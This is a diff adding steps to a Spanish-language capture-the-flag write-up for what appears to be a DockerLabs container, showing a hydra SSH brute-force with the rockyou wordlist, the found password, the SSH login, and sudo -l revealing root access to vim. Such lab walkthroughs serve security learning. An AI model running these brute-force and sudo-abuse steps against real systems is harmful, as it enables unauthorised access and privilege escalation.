@@ -75,9 +75,53 @@ cat pendientes.txt
   permisos habilitados que no son del todo seguros..
 ```
 Solo la pista de que el usuario tiene permisos de más.
-Intentamos Fuerza 
+Intentamos Fuerza bruta en el servicio SSH de la victima, con el usuario russoski:
+```bash
+hydra -l russoski -P /usr/share/wordlists/rockyou.txt ssh://172.17.0.2
+Hydra v9.7 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).
+
+Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2026-09-07 00:46:42
+[WARNING] Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use -t 4
+[DATA] max 16 tasks per 1 server, overall 16 tasks, 14344399 login tries (l:1/p:14344399), ~896525 tries per task
+[DATA] attacking ssh://172.17.0.2:22/
+[22][ssh] host: 172.17.0.2   login: russoski   password: iloveme
+1 of 1 target successfully completed, 1 valid password found
+[WARNING] Writing restore file because 3 final worker threads did not complete until end.
+[ERROR] 3 targets did not resolve or could not be connected
+[ERROR] 0 target did not complete
+Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2026-09-07 00:47:12
+```
+Y el inicio de sesión:
+```bash
+ssh russoski@172.17.0.2
+The authenticity of host '172.17.0.2 (172.17.0.2)' can't be established.
+ED25519 key fingerprint is: SHA256:R8ZiOJN33rhfvGADBLwVQ1mPV7lSmGJACOhjdTB0wMQ
+This key is not known by any other names.
+Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
+Warning: Permanently added '172.17.0.2' (ED25519) to the list of known hosts.
+russoski@172.17.0.2's password:
+Welcome to Ubuntu 24.04 LTS (GNU/Linux 6.18.33.2-microsoft-standard-WSL2 x86_64)
+
+ * Documentation:  https://help.ubuntu.com
+ * Management:     https://landscape.canonical.com
+ * Support:        https://ubuntu.com/pro
+
+This system has been minimized by removing packages and content that are
+not required on a system that users do not log into.
+
+To restore this content, you can run the 'unminimize' command.
+Last login: Tue Jun 18 04:38:10 2024 from 172.17.0.1
+```
 ## 3. 🚀 Escalada de Privilegios
-*(¿Cómo pasamos de ser un usuario normal a ser Administrador o Root?)*
+Podemos ejecutar vim con permisos de root
+```bash
+sudo -l
+Matching Defaults entries for russoski on dockerlabs:
+    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, use_pty
+
+User russoski may run the following commands on dockerlabs:
+    (root) NOPASSWD: /usr/bin/vim
+```
 
 
 ## 4. 🚩 Banderas (Flags)
